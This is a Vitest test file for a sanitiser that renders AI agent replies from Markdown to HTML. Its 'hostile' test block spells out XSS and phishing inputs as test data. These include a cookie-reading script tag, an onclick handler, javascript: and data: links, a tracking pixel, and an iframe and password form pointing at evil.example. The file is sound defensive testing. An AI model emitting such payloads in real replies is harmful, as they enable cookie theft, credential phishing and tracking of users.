import { describe, expect, it } from 'vitest';
import { renderAgentMarkdown } from './markdown';

describe('renderAgentMarkdown', () => {
	it('renders the formatting a reply actually uses', () => {
		const html = renderAgentMarkdown(
			['## Today', '', '- **Urgent**: renewal due', '- `invoice.pdf` attached', '', '> quoted'].join('\n')
		);

		expect(html).toContain('<h3>Today</h3>');
		expect(html).toContain('<strong>Urgent</strong>');
		expect(html).toContain('<code>invoice.pdf</code>');
		expect(html).toContain('<blockquote>');
		expect(html).toContain('<li>');
	});

	it('keeps single newlines as line breaks', () => {
		expect(renderAgentMarkdown('first line\nsecond line')).toContain('<br');
	});

	it('is empty for empty input', () => {
		expect(renderAgentMarkdown('')).toBe('');
		expect(renderAgentMarkdown('   \n  ')).toBe('');
	});

	describe('treats model output as hostile', () => {
		it('drops script tags and their contents', () => {
			const html = renderAgentMarkdown('Hi <script>alert(document.cookie)</script> there');
			expect(html).not.toContain('<script');
			expect(html).not.toContain('alert(');
		});

		it('drops event-handler attributes', () => {
			const html = renderAgentMarkdown('<p onclick="steal()">click me</p>');
			expect(html).not.toContain('onclick');
			expect(html).toContain('click me');
		});

		it('strips javascript: and data: links but keeps the text', () => {
			for (const href of ['javascript:alert(1)', 'data:text/html;base64,PHNjcmlwdD4=']) {
				const html = renderAgentMarkdown(`[click](${href})`);
				expect(html).not.toContain('javascript:');
				expect(html).not.toContain('data:');
				expect(html).toContain('click');
			}
		});

		it('does not emit remote images that would beacon back', () => {
			const html = renderAgentMarkdown('![x](https://tracker.example/pixel.png)');
			expect(html).not.toContain('<img');
			expect(html).not.toContain('tracker.example');
		});

		it('drops iframes, forms, and inline styles', () => {
			const html = renderAgentMarkdown(
				'<iframe src="https://evil.example"></iframe>' +
					'<form action="https://evil.example"><input name="password"></form>' +
					'<p style="position:fixed;top:0">overlay</p>'
			);
			expect(html).not.toContain('<iframe');
			expect(html).not.toContain('<form');
			expect(html).not.toContain('<input');
			expect(html).not.toContain('style=');
		});

		it('opens model links in a new tab without window.opener access', () => {
			const html = renderAgentMarkdown('[docs](https://example.com/a)');
			expect(html).toContain('href="https://example.com/a"');
			expect(html).toContain('target="_blank"');
			expect(html).toContain('rel="noopener noreferrer nofollow"');
		});

		it('overrides link hardening the model tries to set for itself', () => {
			const html = renderAgentMarkdown(
				'<a href="https://x.example" target="_top" rel="opener">x</a>'
			);
			expect(html).toContain('target="_blank"');
			expect(html).not.toContain('_top');
			expect(html).not.toContain('rel="opener"');
		});

		it('demotes headings so a reply cannot outrank the panel title', () => {
			const html = renderAgentMarkdown('# Top\n\n## Second');
			expect(html).not.toContain('<h1>');
			expect(html).not.toContain('<h2>');
			expect(html).toContain('<h3>Top</h3>');
		});
	});
});
